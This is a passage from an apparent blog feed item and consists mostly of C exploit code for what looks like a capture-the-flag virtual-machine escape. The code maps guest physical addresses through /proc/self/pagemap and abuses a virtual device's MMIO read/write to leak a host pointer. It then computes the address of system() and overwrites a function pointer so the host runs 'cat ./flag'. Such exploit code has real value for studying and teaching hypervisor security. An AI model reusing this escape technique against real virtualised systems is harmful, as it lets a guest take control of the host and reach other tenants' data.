<span id="cb14-101"><a href="#cb14-101" aria-hidden="true"></a>    <span class="cf">return</span> gfn;</span>
<span id="cb14-102"><a href="#cb14-102" aria-hidden="true"></a>}</span>
<span id="cb14-103"><a href="#cb14-103" aria-hidden="true"></a></span>
<span id="cb14-104"><a href="#cb14-104" aria-hidden="true"></a><span class="co">/*</span></span>
<span id="cb14-105"><a href="#cb14-105" aria-hidden="true"></a><span class="co">* transfer visual address to physic address</span></span>
<span id="cb14-106"><a href="#cb14-106" aria-hidden="true"></a><span class="co">*/</span></span>
<span id="cb14-107"><a href="#cb14-107" aria-hidden="true"></a><span class="dt">uint64_t</span> gva_to_gpa(<span class="dt">void</span> *addr)</span>
<span id="cb14-108"><a href="#cb14-108" aria-hidden="true"></a>{</span>
<span id="cb14-109"><a href="#cb14-109" aria-hidden="true"></a>    <span class="dt">uint64_t</span> gfn = gva_to_gfn(addr);</span>
<span id="cb14-110"><a href="#cb14-110" aria-hidden="true"></a>    <span class="cf">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="dt">uint64_t</span>)addr);</span>
<span id="cb14-111"><a href="#cb14-111" aria-hidden="true"></a>}</span>
<span id="cb14-112"><a href="#cb14-112" aria-hidden="true"></a></span>
<span id="cb14-113"><a href="#cb14-113" aria-hidden="true"></a></span>
<span id="cb14-114"><a href="#cb14-114" aria-hidden="true"></a><span class="dt">size_t</span> va2pa(<span class="dt">void</span> *addr){</span>
<span id="cb14-115"><a href="#cb14-115" aria-hidden="true"></a>    <span class="dt">uint64_t</span> data;</span>
<span id="cb14-116"><a href="#cb14-116" aria-hidden="true"></a></span>
<span id="cb14-117"><a href="#cb14-117" aria-hidden="true"></a>    <span class="dt">size_t</span> pagesize = getpagesize();</span>
<span id="cb14-118"><a href="#cb14-118" aria-hidden="true"></a>    <span class="dt">size_t</span> offset = ((<span class="dt">uintptr_t</span>)addr / pagesize) * <span class="kw">sizeof</span>(<span class="dt">uint64_t</span>);</span>
<span id="cb14-119"><a href="#cb14-119" aria-hidden="true"></a></span>
<span id="cb14-120"><a href="#cb14-120" aria-hidden="true"></a>    <span class="cf">if</span>(lseek(fd,offset,SEEK_SET) &lt; <span class="dv">0</span>){</span>
<span id="cb14-121"><a href="#cb14-121" aria-hidden="true"></a>        puts(<span class="st">&quot;lseek&quot;</span>);</span>
<span id="cb14-122"><a href="#cb14-122" aria-hidden="true"></a>        close(fd);</span>
<span id="cb14-123"><a href="#cb14-123" aria-hidden="true"></a>        <span class="cf">return</span> <span class="dv">0</span>;</span>
<span id="cb14-124"><a href="#cb14-124" aria-hidden="true"></a>    }</span>
<span id="cb14-125"><a href="#cb14-125" aria-hidden="true"></a></span>
<span id="cb14-126"><a href="#cb14-126" aria-hidden="true"></a>    <span class="cf">if</span>(read(fd,&amp;data,<span class="dv">8</span>) != <span class="dv">8</span>){</span>
<span id="cb14-127"><a href="#cb14-127" aria-hidden="true"></a>        puts(<span class="st">&quot;read&quot;</span>);</span>
<span id="cb14-128"><a href="#cb14-128" aria-hidden="true"></a>        close(fd);</span>
<span id="cb14-129"><a href="#cb14-129" aria-hidden="true"></a>        <span class="cf">return</span> <span class="dv">0</span>;</span>
<span id="cb14-130"><a href="#cb14-130" aria-hidden="true"></a>    }</span>
<span id="cb14-131"><a href="#cb14-131" aria-hidden="true"></a></span>
<span id="cb14-132"><a href="#cb14-132" aria-hidden="true"></a>    <span class="cf">if</span>(!(data &amp; (((<span class="dt">uint64_t</span>)<span class="dv">1</span> &lt;&lt; <span class="dv">63</span>)))){</span>
<span id="cb14-133"><a href="#cb14-133" aria-hidden="true"></a>        puts(<span class="st">&quot;page&quot;</span>);</span>
<span id="cb14-134"><a href="#cb14-134" aria-hidden="true"></a>        close(fd);</span>
<span id="cb14-135"><a href="#cb14-135" aria-hidden="true"></a>        <span class="cf">return</span> <span class="dv">0</span>;</span>
<span id="cb14-136"><a href="#cb14-136" aria-hidden="true"></a>    }</span>
<span id="cb14-137"><a href="#cb14-137" aria-hidden="true"></a></span>
<span id="cb14-138"><a href="#cb14-138" aria-hidden="true"></a>    <span class="dt">size_t</span> pageframenum = data &amp; ((<span class="dv">1</span><span class="bu">ull</span> &lt;&lt; <span class="dv">55</span>) - <span class="dv">1</span>);</span>
<span id="cb14-139"><a href="#cb14-139" aria-hidden="true"></a>    <span class="dt">size_t</span> phyaddr = pageframenum * pagesize + (<span class="dt">uintptr_t</span>)addr % pagesize;</span>
<span id="cb14-140"><a href="#cb14-140" aria-hidden="true"></a></span>
<span id="cb14-141"><a href="#cb14-141" aria-hidden="true"></a>    close(fd);</span>
<span id="cb14-142"><a href="#cb14-142" aria-hidden="true"></a></span>
<span id="cb14-143"><a href="#cb14-143" aria-hidden="true"></a>    <span class="cf">return</span> phyaddr;</span>
<span id="cb14-144"><a href="#cb14-144" aria-hidden="true"></a>}</span>
<span id="cb14-145"><a href="#cb14-145" aria-hidden="true"></a></span>
<span id="cb14-146"><a href="#cb14-146" aria-hidden="true"></a><span class="dt">void</span> print_hex(<span class="dt">uint64_t</span> len, <span class="dt">uint64_t</span> offset){</span>
<span id="cb14-147"><a href="#cb14-147" aria-hidden="true"></a>    printf(<span class="st">&quot;===========================</span><span class="sc">\n</span><span class="st">&quot;</span>);</span>
<span id="cb14-148"><a href="#cb14-148" aria-hidden="true"></a>    <span class="cf">for</span>(<span class="dt">int</span> i = <span class="dv">0</span>; i&lt;len/<span class="dv">8</span>; i++){</span>
<span id="cb14-149"><a href="#cb14-149" aria-hidden="true"></a>        printf(<span class="st">&quot;    0x%lx</span><span class="sc">\n</span><span class="st">&quot;</span>, *(<span class="dt">uint64_t</span>*)(userbuf1+offset+i*<span class="dv">8</span>));</span>
<span id="cb14-150"><a href="#cb14-150" aria-hidden="true"></a>    }</span>
<span id="cb14-151"><a href="#cb14-151" aria-hidden="true"></a>}</span>
<span id="cb14-152"><a href="#cb14-152" aria-hidden="true"></a></span>
<span id="cb14-153"><a href="#cb14-153" aria-hidden="true"></a><span class="dt">size_t</span> buf0, buf1;</span>
<span id="cb14-154"><a href="#cb14-154" aria-hidden="true"></a></span>
<span id="cb14-155"><a href="#cb14-155" aria-hidden="true"></a><span class="dt">void</span> get_pages()</span>
<span id="cb14-156"><a href="#cb14-156" aria-hidden="true"></a>{</span>
<span id="cb14-157"><a href="#cb14-157" aria-hidden="true"></a>    <span class="dt">size_t</span> buf[<span class="bn">0x1000</span>];</span>
<span id="cb14-158"><a href="#cb14-158" aria-hidden="true"></a>    <span class="dt">size_t</span> arry[<span class="bn">0x1000</span>];</span>
<span id="cb14-159"><a href="#cb14-159" aria-hidden="true"></a>    <span class="dt">size_t</span> arr = mmap(NULL, <span class="bn">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, <span class="dv">0</span>, <span class="dv">0</span>);</span>
<span id="cb14-160"><a href="#cb14-160" aria-hidden="true"></a>    *(<span class="dt">char</span> *)arr = <span class="ch">&#39;a&#39;</span>;</span>
<span id="cb14-161"><a href="#cb14-161" aria-hidden="true"></a>    <span class="dt">int</span> n = <span class="dv">0</span>;</span>
<span id="cb14-162"><a href="#cb14-162" aria-hidden="true"></a>    buf[n] = gva_to_gfn(arr);</span>
<span id="cb14-163"><a href="#cb14-163" aria-hidden="true"></a>    arry[n++] = arr;</span>
<span id="cb14-164"><a href="#cb14-164" aria-hidden="true"></a>    <span class="cf">for</span> (<span class="dt">int</span> i = <span class="dv">1</span>; i &lt; <span class="bn">0x1000</span>; i++)</span>
<span id="cb14-165"><a href="#cb14-165" aria-hidden="true"></a>    {</span>
<span id="cb14-166"><a href="#cb14-166" aria-hidden="true"></a>        arr = mmap(NULL, <span class="bn">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, <span class="dv">0</span>, <span class="dv">0</span>);</span>
<span id="cb14-167"><a href="#cb14-167" aria-hidden="true"></a>        *(<span class="dt">char</span> *)arr = <span class="ch">&#39;a&#39;</span>;</span>
<span id="cb14-168"><a href="#cb14-168" aria-hidden="true"></a>        <span class="dt">size_t</span> fn = gva_to_gfn(arr);</span>
<span id="cb14-169"><a href="#cb14-169" aria-hidden="true"></a>        <span class="cf">for</span> (<span class="dt">int</span> j = <span class="dv">0</span>; j &lt; n; j++)</span>
<span id="cb14-170"><a href="#cb14-170" aria-hidden="true"></a>        {</span>
<span id="cb14-171"><a href="#cb14-171" aria-hidden="true"></a>            <span class="cf">if</span> (buf[j] == fn + <span class="dv">1</span> || buf[j] + <span class="dv">1</span> == fn)</span>
<span id="cb14-172"><a href="#cb14-172" aria-hidden="true"></a>            {</span>
<span id="cb14-173"><a href="#cb14-173" aria-hidden="true"></a>                LOG(<span class="st">&quot;consist pages&quot;</span>);</span>
<span id="cb14-174"><a href="#cb14-174" aria-hidden="true"></a>                HEX(arr);</span>
<span id="cb14-175"><a href="#cb14-175" aria-hidden="true"></a>                HEX(fn);</span>
<span id="cb14-176"><a href="#cb14-176" aria-hidden="true"></a>                HEX(arry[j]);</span>
<span id="cb14-177"><a href="#cb14-177" aria-hidden="true"></a>                HEX(buf[j]);</span>
<span id="cb14-178"><a href="#cb14-178" aria-hidden="true"></a>                <span class="cf">if</span> (fn &gt; buf[j])</span>
<span id="cb14-179"><a href="#cb14-179" aria-hidden="true"></a>                {</span>
<span id="cb14-180"><a href="#cb14-180" aria-hidden="true"></a>                    buf0 = arry[j];</span>
<span id="cb14-181"><a href="#cb14-181" aria-hidden="true"></a>                    buf1 = arr;</span>
<span id="cb14-182"><a href="#cb14-182" aria-hidden="true"></a>                    phy_buf0 = (buf[j]&lt;&lt;<span class="dv">12</span>);</span>
<span id="cb14-183"><a href="#cb14-183" aria-hidden="true"></a>                }</span>
<span id="cb14-184"><a href="#cb14-184" aria-hidden="true"></a>                <span class="cf">else</span></span>
<span id="cb14-185"><a href="#cb14-185" aria-hidden="true"></a>                {</span>
<span id="cb14-186"><a href="#cb14-186" aria-hidden="true"></a>                    buf1 = arry[j];</span>
<span id="cb14-187"><a href="#cb14-187" aria-hidden="true"></a>                    buf0 = arr;</span>
<span id="cb14-188"><a href="#cb14-188" aria-hidden="true"></a>                    phy_buf0 = (fn&lt;&lt;<span class="dv">12</span>);</span>
<span id="cb14-189"><a href="#cb14-189" aria-hidden="true"></a>                }</span>
<span id="cb14-190"><a href="#cb14-190" aria-hidden="true"></a>                <span class="cf">return</span>;</span>
<span id="cb14-191"><a href="#cb14-191" aria-hidden="true"></a>            }</span>
<span id="cb14-192"><a href="#cb14-192" aria-hidden="true"></a>        }</span>
<span id="cb14-193"><a href="#cb14-193" aria-hidden="true"></a>        buf[n] = fn;</span>
<span id="cb14-194"><a href="#cb14-194" aria-hidden="true"></a>        arry[n++] = arr;</span>
<span id="cb14-195"><a href="#cb14-195" aria-hidden="true"></a>    }</span>
<span id="cb14-196"><a href="#cb14-196" aria-hidden="true"></a>}</span>
<span id="cb14-197"><a href="#cb14-197" aria-hidden="true"></a></span>
<span id="cb14-198"><a href="#cb14-198" aria-hidden="true"></a><span class="dt">int</span> main(){</span>
<span id="cb14-199"><a href="#cb14-199" aria-hidden="true"></a></span>
<span id="cb14-200"><a href="#cb14-200" aria-hidden="true"></a>    fd = open(<span class="st">&quot;/proc/self/pagemap&quot;</span>,O_RDONLY);</span>
<span id="cb14-201"><a href="#cb14-201" aria-hidden="true"></a>    <span class="cf">if</span>(!fd){</span>
<span id="cb14-202"><a href="#cb14-202" aria-hidden="true"></a>        perror(<span class="st">&quot;open pagemap&quot;</span>);</span>
<span id="cb14-203"><a href="#cb14-203" aria-hidden="true"></a>        <span class="cf">return</span> <span class="dv">0</span>;</span>
<span id="cb14-204"><a href="#cb14-204" aria-hidden="true"></a>    }</span>
<span id="cb14-205"><a href="#cb14-205" aria-hidden="true"></a>    get_pages();</span>
<span id="cb14-206"><a href="#cb14-206" aria-hidden="true"></a></span>
<span id="cb14-207"><a href="#cb14-207" aria-hidden="true"></a>    printf(<span class="st">&quot;init mmio:</span><span class="sc">\n</span><span class="st">&quot;</span>);</span>
<span id="cb14-208"><a href="#cb14-208" aria-hidden="true"></a>    init_mmio();</span>
<span id="cb14-209"><a href="#cb14-209" aria-hidden="true"></a></span>
<span id="cb14-210"><a href="#cb14-210" aria-hidden="true"></a>    userbuf = mmap(<span class="dv">0</span>, <span class="bn">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -<span class="dv">1</span>, <span class="dv">0</span>);</span>
<span id="cb14-211"><a href="#cb14-211" aria-hidden="true"></a>    <span class="cf">if</span> (userbuf == MAP_FAILED)</span>
<span id="cb14-212"><a href="#cb14-212" aria-hidden="true"></a>        Err(<span class="st">&quot;mmap userbuf&quot;</span>);</span>
<span id="cb14-213"><a href="#cb14-213" aria-hidden="true"></a>    mlock(userbuf, <span class="bn">0x1000</span>);</span>
<span id="cb14-214"><a href="#cb14-214" aria-hidden="true"></a>    phy_userbuf = va2pa(userbuf);</span>
<span id="cb14-215"><a href="#cb14-215" aria-hidden="true"></a>    printf(<span class="st">&quot;userbuf va: 0x%llx</span><span class="sc">\n</span><span class="st">&quot;</span>, userbuf);</span>
<span id="cb14-216"><a href="#cb14-216" aria-hidden="true"></a>    printf(<span class="st">&quot;userbuf pa: 0x%llx</span><span class="sc">\n</span><span class="st">&quot;</span>, phy_userbuf);</span>
<span id="cb14-217"><a href="#cb14-217" aria-hidden="true"></a></span>
<span id="cb14-218"><a href="#cb14-218" aria-hidden="true"></a>    memset(buf0, <span class="ch">&#39;a&#39;</span>, <span class="bn">0x1000</span>);</span>
<span id="cb14-219"><a href="#cb14-219" aria-hidden="true"></a>    memset(buf1, <span class="ch">&#39;a&#39;</span>, <span class="bn">0x1000</span>);</span>
<span id="cb14-220"><a href="#cb14-220" aria-hidden="true"></a>    printf(<span class="st">&quot;[++++] 0x%lx %p</span><span class="sc">\n</span><span class="st">&quot;</span>, buf0, buf0);</span>
<span id="cb14-221"><a href="#cb14-221" aria-hidden="true"></a>    printf(<span class="st">&quot;phy_buf0: 0x%lx</span><span class="sc">\n</span><span class="st">&quot;</span>, phy_buf0);</span>
<span id="cb14-222"><a href="#cb14-222" aria-hidden="true"></a></span>
<span id="cb14-223"><a href="#cb14-223" aria-hidden="true"></a>    printf(<span class="st">&quot;leak addr:</span><span class="sc">\n</span><span class="st">&quot;</span>);</span>
<span id="cb14-224"><a href="#cb14-224" aria-hidden="true"></a>    *(<span class="dt">uint64_t</span>*)(userbuf) = phy_userbuf;</span>
<span id="cb14-225"><a href="#cb14-225" aria-hidden="true"></a>    *(<span class="dt">uint64_t</span>*)(userbuf+<span class="bn">0x8</span>) = <span class="bn">0x1000</span>;</span>
<span id="cb14-226"><a href="#cb14-226" aria-hidden="true"></a>    *(<span class="dt">uint64_t</span>*)(userbuf+<span class="bn">0x10</span>) = phy_buf0;</span>
<span id="cb14-227"><a href="#cb14-227" aria-hidden="true"></a>    *(<span class="dt">uint64_t</span>*)(userbuf+<span class="bn">0xff8</span>) = phy_buf0;</span>
<span id="cb14-228"><a href="#cb14-228" aria-hidden="true"></a>    set_write(<span class="bn">0x1</span>);</span>
<span id="cb14-229"><a href="#cb14-229" aria-hidden="true"></a>    sleep(<span class="dv">1</span>);</span>
<span id="cb14-230"><a href="#cb14-230" aria-hidden="true"></a>    <span class="cf">for</span>(<span class="dt">int</span> i=<span class="dv">0</span>; i&lt;<span class="dv">17</span>; i++){</span>
<span id="cb14-231"><a href="#cb14-231" aria-hidden="true"></a>        *(<span class="dt">uint64_t</span>*)(userbuf+i*<span class="bn">0x18</span>) = phy_userbuf;</span>
<span id="cb14-232"><a href="#cb14-232" aria-hidden="true"></a>        *(<span class="dt">uint64_t</span>*)(userbuf+<span class="bn">0x8</span>+i*<span class="bn">0x18</span>) = <span class="bn">0x1040</span>;</span>
<span id="cb14-233"><a href="#cb14-233" aria-hidden="true"></a>        *(<span class="dt">uint64_t</span>*)(userbuf+<span class="bn">0x10</span>+i*<span class="bn">0x18</span>) = phy_buf0;</span>
<span id="cb14-234"><a href="#cb14-234" aria-hidden="true"></a>    }</span>
<span id="cb14-235"><a href="#cb14-235" aria-hidden="true"></a>    set_read(<span class="bn">0x1</span>);</span>
<span id="cb14-236"><a href="#cb14-236" aria-hidden="true"></a>    <span class="co">//sleep(3);</span></span>
<span id="cb14-237"><a href="#cb14-237" aria-hidden="true"></a></span>
<span id="cb14-238"><a href="#cb14-238" aria-hidden="true"></a>    <span class="dt">size_t</span> buf_addr = *(<span class="dt">size_t</span>*)(buf1+<span class="bn">0x18</span>)+<span class="bn">0xa00</span>;</span>
<span id="cb14-239"><a href="#cb14-239" aria-hidden="true"></a>    <span class="dt">size_t</span> t_addr = *(<span class="dt">uint64_t</span>*)(buf1+<span class="bn">0x10</span>);</span>
<span id="cb14-240"><a href="#cb14-240" aria-hidden="true"></a>    printf(<span class="st">&quot;timer_addr: 0x%llx 0x%lx</span><span class="sc">\n</span><span class="st">&quot;</span>, buf_addr, t_addr);</span>
<span id="cb14-241"><a href="#cb14-241" aria-hidden="true"></a>    <span class="dt">size_t</span> system_plt = t_addr - <span class="bn">0x4dce80</span> + <span class="bn">0x2c2180</span>;</span>
<span id="cb14-242"><a href="#cb14-242" aria-hidden="true"></a>    printf(<span class="st">&quot;system_plt: 0x%llx</span><span class="sc">\n</span><span class="st">&quot;</span>, system_plt);</span>
<span id="cb14-243"><a href="#cb14-243" aria-hidden="true"></a></span>
<span id="cb14-244"><a href="#cb14-244" aria-hidden="true"></a>    printf(<span class="st">&quot;write ptr:</span><span class="sc">\n</span><span class="st">&quot;</span>);</span>
<span id="cb14-245"><a href="#cb14-245" aria-hidden="true"></a>    <span class="cf">for</span>(<span class="dt">int</span> i=<span class="dv">0</span>; i&lt;<span class="dv">17</span>; i++){</span>
<span id="cb14-246"><a href="#cb14-246" aria-hidden="true"></a>        *(<span class="dt">uint64_t</span>*)(userbuf+i*<span class="bn">0x18</span>) = phy_buf0;</span>
<span id="cb14-247"><a href="#cb14-247" aria-hidden="true"></a>        *(<span class="dt">uint64_t</span>*)(userbuf+<span class="bn">0x8</span>+i*<span class="bn">0x18</span>) = <span class="bn">0x1020</span>;</span>
<span id="cb14-248"><a href="#cb14-248" aria-hidden="true"></a>        *(<span class="dt">uint64_t</span>*)(userbuf+<span class="bn">0x10</span>+i*<span class="bn">0x18</span>) = phy_buf0;</span>
<span id="cb14-249"><a href="#cb14-249" aria-hidden="true"></a>    }</span>
<span id="cb14-250"><a href="#cb14-250" aria-hidden="true"></a>    *(<span class="dt">uint64_t</span>*)(buf1+<span class="bn">0x10</span>) = system_plt;</span>
<span id="cb14-251"><a href="#cb14-251" aria-hidden="true"></a>    *(<span class="dt">uint64_t</span>*)(buf1+<span class="bn">0x18</span>) = buf_addr;</span>
<span id="cb14-252"><a href="#cb14-252" aria-hidden="true"></a>    <span class="dt">char</span> *command=<span class="st">&quot;cat ./flag</span><span class="sc">\x00</span><span class="st">&quot;</span>;</span>
<span id="cb14-253"><a href="#cb14-253" aria-hidden="true"></a>    memcpy(buf0,command,strlen(command));</span>
<span id="cb14-254"><a href="#cb14-254" aria-hidden="true"></a>    printf(<span class="st">&quot;cover system addr</span><span class="sc">\n</span><span class="st">&quot;</span>);</span>
<span id="cb14-255"><a href="#cb14-255" aria-hidden="true"></a>    set_read_write(<span class="bn">0x11</span>);</span>
<span id="cb14-256"><a href="#cb14-256" aria-hidden="true"></a>    printf(<span class="st">&quot;trigger vul</span><span class="sc">\n</span><span class="st">&quot;</span>);</span>
<span id="cb14-257"><a href="#cb14-257" aria-hidden="true"></a>    set_read(<span class="bn">0x1</span>);</span>
<span id="cb14-258"><a href="#cb14-258" aria-hidden="true"></a>    <span class="cf">return</span> <span class="dv">0</span>;</span>
<span id="cb14-259"><a href="#cb14-259" aria-hidden="true"></a>}</span></code></pre></div>]]></description>
    <pubDate>Tue, 8 Nov 2022 17:20:42 +0800</pubDate>
  </item>
  
</channel>
</rss>
